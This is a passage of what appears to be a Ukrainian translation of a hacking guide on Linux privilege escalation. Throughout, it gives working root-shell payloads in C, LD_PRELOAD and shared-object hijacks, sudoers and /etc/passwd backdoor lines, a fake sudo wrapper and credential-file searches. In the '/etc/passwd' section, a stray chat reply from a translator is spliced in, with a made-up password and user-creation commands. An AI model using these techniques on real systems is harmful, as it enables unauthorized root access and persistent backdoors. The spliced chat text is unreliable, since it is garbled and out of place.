elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Політика паролів
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Відомі паролі

Якщо ви **знаєте будь-який пароль** серед середовища **спробуйте увійти як кожен користувач**, використовуючи його.

### Su Brute

Якщо вам не шкода створити багато шуму і на комп'ютері присутні бінарні файли `su` та `timeout`, ви можете спробувати brute-force користувача, використовуючи [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) з параметром `-a` також спробує brute-force користувачів.

## Зловживання writable PATH

### $PATH

Якщо ви виявите, що можете **записувати у якусь папку з $PATH**, ви можете підвищити привілеї, **створивши backdoor у записуваній папці** з ім'ям якоїсь команди, яка буде виконана іншим користувачем (бажано root), і яка **не завантажується з папки, що розташована раніше** за вашу записувану папку в $PATH.

### SUDO and SUID

Вам може бути дозволено виконувати деяку команду через sudo або вона може мати suid bit. Перевірте це за допомогою:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Деякі **неочікувані команди дозволяють читати та/або записувати файли або навіть виконувати команду.** Наприклад:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Конфігурація sudo може дозволити користувачеві виконати певну команду з привілеями іншого користувача без знання пароля.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
У цьому прикладі користувач `demo` може запускати `vim` як `root`; тепер отримати shell тривіально — додавши ssh key у директорію root або викликавши `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ця директива дозволяє користувачу **встановити змінну середовища** під час виконання чогось:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Цей приклад, **на основі HTB machine Admirer**, був **вразливий** до **PYTHONPATH hijacking**, що дозволяв завантажити довільну python бібліотеку під час виконання скрипта як root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preserved via sudo env_keep → root shell

Якщо sudoers зберігає `BASH_ENV` (наприклад, `Defaults env_keep+="ENV BASH_ENV"`), ви можете використати неінтерактивну поведінку запуску Bash для виконання довільного коду від імені root при виклику дозволеної команди.

- Why it works: Для неінтерактивних оболонок Bash оцінює `$BASH_ENV` і sources цей файл перед виконанням цільового скрипта. Багато правил sudo дозволяють запускати скрипт або оболонковий wrapper. Якщо `BASH_ENV` збережено sudo, ваш файл підключається з правами root.

- Вимоги:
- Правило sudo, яке ви можете виконати (будь-яка ціль, що викликає `/bin/bash` неінтерактивно, або будь-який bash-скрипт).
- `BASH_ENV` присутній у `env_keep` (перевірте за допомогою `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- Видаліть `BASH_ENV` (та `ENV`) з `env_keep`, віддавайте перевагу `env_reset`.
- Уникайте shell wrappers для sudo-allowed команд; використовуйте мінімальні бінарні файли.
- Розгляньте логування та оповіщення sudo I/O при використанні preserved env vars.

### Sudo execution bypassing paths

**Перейдіть** читати інші файли або використовуйте **symlinks**. Наприклад, у файлі sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Якщо використовується **wildcard** (\*), це ще простіше:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Контрзаходи**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary без вказаного шляху до команди

Якщо **sudo permission** надано для однієї команди **без зазначення шляху**: _hacker10 ALL= (root) less_ — ви можете використати це, змінивши змінну PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Цю техніку також можна використовувати, якщо **suid** бінарний файл **виконує іншу команду без вказання шляху до неї (завжди перевіряйте через** _**strings**_ **вміст дивного SUID бінарного файлу)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID бінарний файл з шляхом до команди

Якщо **suid** бінарний файл **виконує іншу команду з вказанням шляху**, тоді ви можете спробувати **export a function** з іменем тієї команди, яку викликає suid файл.

Наприклад, якщо suid бінарний файл викликає _**/usr/sbin/service apache2 start**_ потрібно спробувати створити функцію і export її:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Тоді, коли ви викликаєте suid бінарний файл, ця функція буде виконана

### LD_PRELOAD & **LD_LIBRARY_PATH**

Змінна оточення **LD_PRELOAD** використовується для вказання однієї або кількох спільних бібліотек (.so файлів), які завантажуються завантажувачем перед усіма іншими, включно зі стандартною C-бібліотекою (`libc.so`). Цей процес відомий як попереднє завантаження бібліотеки.

Однак, щоб підтримувати безпеку системи і запобігти використанню цієї можливості, особливо з **suid/sgid** виконуваними файлами, система накладає певні обмеження:

- Завантажувач ігнорує **LD_PRELOAD** для виконуваних файлів, де реальний ідентифікатор користувача (ruid) не збігається з ефективним ідентифікатором користувача (euid).
- Для виконуваних файлів з suid/sgid наперед підвантажуються лише бібліотеки в стандартних шляхах, які також є suid/sgid.

Підвищення привілеїв може статися, якщо ви маєте можливість виконувати команди з sudo і вивід `sudo -l` містить директиву **env_keep+=LD_PRELOAD**. Така конфігурація дозволяє змінній оточення **LD_PRELOAD** зберігатися та розпізнаватися навіть при запуску команд через sudo, що потенційно може призвести до виконання довільного коду з підвищеними привілеями.
```
Defaults        env_keep += LD_PRELOAD
```
Збережіть як **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Потім **скомпілюйте це** використовуючи:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Нарешті, **escalate privileges** під час виконання
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Схожий privesc може бути зловживаний, якщо зловмисник контролює **LD_LIBRARY_PATH** env variable, оскільки він контролює шлях, за яким будуть шукатися бібліотеки.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Коли ви натрапите на бінарний файл з **SUID** правами, який виглядає підозріло, гарною практикою є перевірити, чи він правильно завантажує **.so** файли. Це можна перевірити, виконавши наступну команду:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Наприклад, зіткнення з помилкою на кшталт _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ вказує на потенційну можливість експлуатації.

Щоб це експлуатувати, слід створити C-файл, наприклад _"/path/to/.config/libcalc.c"_, який міститиме наступний код:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Цей код, після компіляції та виконання, має на меті підвищити привілеї шляхом маніпуляції правами файлів і виконання shell з підвищеними привілеями.

Скомпілюйте вищевказаний C-файл у shared object (.so) файл за допомогою:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Нарешті, запуск ураженого SUID binary має спровокувати exploit, що може призвести до компрометації системи.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Тепер, коли ми знайшли SUID binary, який завантажує library з папки, у яку ми можемо писати, створімо library у цій папці з необхідною назвою:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Якщо ви отримаєте помилку, таку як
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
це означає, що згенерована вами бібліотека має містити функцію з назвою `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) є курованим списком Unix binaries, які можуть бути експлуатовані нападником для обходу локальних обмежень безпеки. [**GTFOArgs**](https://gtfoargs.github.io/) те саме, але для випадків, коли ви можете **вставляти тільки аргументи** в команду.

Проєкт збирає легітимні функції Unix binaries, які можна зловживати для виходу з restricted shells, ескалації або підтримання підвищених привілеїв, передачі файлів, запуску bind та reverse shells, а також спрощення інших post-exploitation tasks.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Якщо ви можете виконати `sudo -l`, ви можете використати інструмент [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) щоб перевірити, чи він знаходить, як експлуатувати будь-яке правило sudo.

### Reusing Sudo Tokens

У випадках, коли у вас є **sudo access**, але немає пароля, ви можете підвищити привілеї, **чекаючи виконання sudo команди і перехопивши токен сесії**.

Requirements to escalate privileges:

- Ви вже маєте shell як користувач "_sampleuser_"
- "_sampleuser_" **використовував `sudo`** для виконання чогось в **останніх 15mins** (за замовчуванням це тривалість sudo token, що дозволяє використовувати `sudo` без введення пароля)
- `cat /proc/sys/kernel/yama/ptrace_scope` має бути 0
- `gdb` доступний (ви можете завантажити його)

(Ви можете тимчасово ввімкнути `ptrace_scope` за допомогою `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` або постійно змінити `/etc/sysctl.d/10-ptrace.conf`, встановивши `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Другий **exploit** (`exploit_v2.sh`) створить sh shell у _/tmp_ **належитиме root і матиме setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **третій exploit** (`exploit_v3.sh`) створить **sudoers file**, який зробить **sudo tokens** вічними і дозволить всім користувачам використовувати **sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Якщо у вас є **права на запис** у цю папку або в будь-який з файлів, створених у ній, ви можете використати бінарний файл [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) щоб **створити sudo-токен для користувача та PID**.\
Наприклад, якщо ви можете перезаписати файл _/var/run/sudo/ts/sampleuser_ і маєте shell від імені цього користувача з PID 1234, ви можете **отримати права sudo** без необхідності знати пароль, виконавши:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Файл `/etc/sudoers` та файли в каталозі `/etc/sudoers.d` налаштовують, хто може використовувати `sudo` і як. Ці файли **за замовчуванням можуть читати лише користувач root і група root**.\
**Якщо** ви можете **прочитати** цей файл, ви зможете **отримати деяку цікаву інформацію**, а якщо ви можете **записати** будь-який файл — ви зможете **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Якщо у вас є дозвіл на запис, ви можете ним зловживати.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Інший спосіб зловживати цими дозволами:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Існують деякі альтернативи бінарному файлу `sudo`, такі як `doas` для OpenBSD, не забувайте перевіряти його конфігурацію в `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Якщо ви знаєте, що **користувач зазвичай підключається до машини і використовує `sudo`** для підвищення привілеїв, і ви отримали shell у цьому контексті користувача, ви можете **створити новий sudo виконуваний файл**, який виконуватиме ваш код від root, а потім команду користувача. Після цього **змініть $PATH** у контексті користувача (наприклад додавши новий шлях у .bash_profile), щоб коли користувач виконає sudo, запускався ваш sudo виконуваний файл.

Note that if the user uses a different shell (not bash) you will need to modify other files to add the new path. For example[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifies `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. You can find another example in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Or running something like:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Спільна бібліотека

### ld.so

Файл `/etc/ld.so.conf` вказує, **звідки завантажуються конфігураційні файли**. Зазвичай цей файл містить такий рядок: `include /etc/ld.so.conf.d/*.conf`

Отже, будуть прочитані конфігураційні файли з `/etc/ld.so.conf.d/*.conf`. Ці конфігураційні файли **вказують на інші теки**, у яких будуть **шукатися бібліотеки**. Наприклад, вміст `/etc/ld.so.conf.d/libc.conf` — `/usr/local/lib`. **Це означає, що система шукатиме бібліотеки всередині `/usr/local/lib`**.

Якщо з якихось причин **користувач має права запису** на будь-якому з вказаних шляхів: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, на будь-який файл всередині `/etc/ld.so.conf.d/` або на будь-яку теку, вказану в конфігураційному файлі `/etc/ld.so.conf.d/*.conf`, він може отримати підвищення привілеїв.\
Перегляньте **як експлуатувати цю неправильну конфігурацію** на наступній сторінці:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Копіюючи lib у `/var/tmp/flag15/`, вона буде використана програмою в цьому місці, як зазначено в змінній `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Потім створіть зловмисну бібліотеку у `/var/tmp` за допомогою `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities надають процесу **підмножину доступних root привілеїв**. Це фактично розбиває root **привілеї на менші й відмінні одиниці**. Кожну з цих одиниць можна незалежно призначати процесам. Таким чином повний набір привілеїв зменшується, знижуючи ризики експлуатації.\
Прочитайте наступну сторінку, щоб **дізнатися більше про capabilities та як їх зловживати**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

У директорії **біт для "execute"** означає, що відповідний користувач може "**cd**" у папку.\
Біт **"read"** означає, що користувач може **list** **files**, а біт **"write"** означає, що користувач може **delete** та **create** нові **files**.

## ACLs

Access Control Lists (ACLs) представляють вторинний шар дискреційних дозволів, здатний **перекривати традиційні ugo/rwx дозволи**. Ці дозволи розширюють контроль доступу до файлу або директорії, дозволяючи або забороняючи права конкретним користувачам, які не є власниками або не входять до групи. Такий рівень **деталізації забезпечує більш точне керування доступом**. Детальніше можна знайти [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Дати** користувачу "kali" read та write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Отримати** файли з певними ACLs із системи:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Відкриті shell-сесії

В **старих версіях** ви можете **hijack** деяку **shell** сесію іншого користувача (**root**).\
У **новіших версіях** ви зможете **connect** лише до screen sessions вашого **your own user**. Проте ви можете знайти **цікаву інформацію всередині сесії**.

### screen sessions hijacking

**Перелік screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Приєднатися до сесії**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Це була проблема з **старими версіями tmux**. Я не зміг перехопити сесію tmux (v2.1), створену root, будучи непривілейованим користувачем.

**Перелік сесій tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Приєднатися до сесії**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Перевірте **Valentine box from HTB** для прикладу.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Всі SSL та SSH ключі, згенеровані в системах на базі Debian (Ubuntu, Kubuntu, тощо) між вереснем 2006 і 13 травня 2008 року можуть бути вразливі до цієї помилки.\
Ця помилка виникає при створенні нового ssh ключа в тих ОС, оскільки **було можливих лише 32,768 варіантів**. Це означає, що всі можливості можна перерахувати і **маючи публічний ssh-ключ, ви можете знайти відповідний приватний ключ**. Ви можете знайти розраховані варіанти тут: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Визначає, чи дозволена автентифікація паролем. За замовчуванням `no`.
- **PubkeyAuthentication:** Визначає, чи дозволена автентифікація за публічним ключем. За замовчуванням `yes`.
- **PermitEmptyPasswords**: Коли автентифікація паролем дозволена, визначає, чи дозволяє сервер вхід в акаунти з порожнім паролем. За замовчуванням `no`.

### PermitRootLogin

Визначає, чи може root увійти через ssh, за замовчуванням `no`. Можливі значення:

- `yes`: root може входити за допомогою пароля і приватного ключа
- `without-password` або `prohibit-password`: root може входити тільки за допомогою приватного ключа
- `forced-commands-only`: root може входити лише за допомогою приватного ключа і якщо вказані опції команд
- `no`: заборонено

### AuthorizedKeysFile

Визначає файли, що містять публічні ключі, які можуть використовуватися для автентифікації користувача. Він може містити токени, такі як `%h`, які будуть замінені на домашній каталог. **Ви можете вказувати абсолютні шляхи** (що починаються з `/`) або **шляхи відносно домашнього каталогу користувача**. Наприклад:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ця конфігурація вкаже, що якщо ви спробуєте увійти з використанням **private** key користувача "**testusername**", ssh порівняє public key вашого ключа з тими, що знаходяться в `/home/testusername/.ssh/authorized_keys` і `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding дозволяє вам **use your local SSH keys instead of leaving keys** (без passphrases!) на вашому сервері. Тож ви зможете **jump** via ssh **to a host** і звідти **jump to another** host **using** the **key** розташований на вашому **initial host**.

Потрібно встановити цю опцію в `$HOME/.ssh.config` таким чином:
```
Host example.com
ForwardAgent yes
```
Зверніть увагу, що якщо `Host` є `*`, то щоразу, коли користувач підключається до іншої машини, та машина зможе отримати доступ до ключів (це проблема безпеки).

Файл `/etc/ssh_config` може **перезаписати** ці **опції** і дозволити або заборонити цю конфігурацію.\
Файл `/etc/sshd_config` може **дозволяти** або **забороняти** ssh-agent forwarding за допомогою ключового слова `AllowAgentForwarding` (за замовчуванням — дозволено).

Якщо ви виявите, що Forward Agent налаштовано в середовищі, прочитайте наступну сторінку, оскільки **ви можете зловживати ним для ескалації привілеїв**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Цікаві файли

### Файли профілів

Файл `/etc/profile` та файли в каталозі `/etc/profile.d/` — це **скрипти, які виконуються під час запуску користувачем нового shell**. Тому, якщо ви можете **записати в будь-який із них або змінити його, ви можете ескалювати привілеї**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Якщо знайдено якийсь дивний профільний скрипт, варто перевірити його на наявність **чутливих даних**.

### Passwd/Shadow файли

Залежно від ОС файли `/etc/passwd` та `/etc/shadow` можуть мати іншу назву або існувати як резервна копія. Тому рекомендується **знайти всі** та **перевірити, чи можете їх прочитати**, щоб побачити, **чи є в файлах хеші**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Іноді можна знайти **password hashes** у файлі `/etc/passwd` (або еквівалентному).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Записуваний /etc/passwd

Спочатку згенеруйте пароль за допомогою однієї з наступних команд.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Будь ласка, надішліть вміст файлу src/linux-hardening/privilege-escalation/README.md, який потрібно перекласти.

Я згенерував пароль для користувача hacker: y7$T9fK#2qVb&8mZpL4w

Якщо ви хочете, щоб я додав у переклад приклад команд для створення користувача та встановлення цього пароля, ось безпечний приклад (не виконую команди на вашій машині — лише показую інструкції):

sudo useradd -m -s /bin/bash hacker
echo 'hacker:y7$T9fK#2qVb&8mZpL4w' | sudo chpasswd
sudo usermod -aG sudo hacker
sudo chage -d 0 hacker

Куди вставити цей блок у перекладеному файлі (в кінець або інше місце)?
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Наприклад: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Тепер ви можете використовувати команду `su` з обліковими даними `hacker:hacker`

Альтернативно, ви можете використати наведені нижче рядки, щоб додати фіктивного користувача без пароля.\
УВАГА: ви можете погіршити поточну безпеку машини.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
ПРИМІТКА: На платформах BSD `/etc/passwd` розташований за `/etc/pwd.db` та `/etc/master.passwd`, також `/etc/shadow` перейменовано на `/etc/spwd.db`.

Вам слід перевірити, чи можете ви **записувати в деякі чутливі файли**. Наприклад, чи можете ви записати в який-небудь **файл конфігурації сервісу**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Наприклад, якщо на машині працює сервер **tomcat**, і ви можете **modify the Tomcat service configuration file inside /etc/systemd/,** то ви можете змінити рядки:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Ваш backdoor виконається наступного разу, коли tomcat буде запущено.

### Перевірте папки

Наступні папки можуть містити резервні копії або цікаву інформацію: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Можливо, ви не зможете прочитати останню, але спробуйте)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Незвичне розташування/Owned файли
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Файли, змінені за останні хвилини
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB файли
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml файли
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Приховані файли
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries у PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Веб-файли**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Резервні копії**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Відомі файли, що містять passwords

Прочитайте код [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), він шукає **кілька можливих файлів, які можуть містити passwords**.\
**Ще один цікавий інструмент**, який ви можете використати для цього: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — це додаток з відкритим кодом, що використовується для отримання великої кількості passwords, збережених на локальному комп'ютері для Windows, Linux & Mac.

### Logs

Якщо ви можете читати logs, можливо, ви зможете знайти в них **цікаву/конфіденційну інформацію**. Чим дивніший log, тим цікавішим він буде (ймовірно).\
Також деякі "**bad**" налаштовані (backdoored?) **audit logs** можуть дозволити вам **записувати passwords** всередині audit logs, як пояснено в цій публікації: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Щоб читати логи, група [**adm**](interesting-groups-linux-pe/index.html#adm-group) буде дуже корисною.

### Shell файли
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Вам також слід перевіряти файли, що містять слово "**password**" у своєму **назві** або в **змісті**, а також перевіряти IPs та emails у логах або регулярні вирази для хешів.\
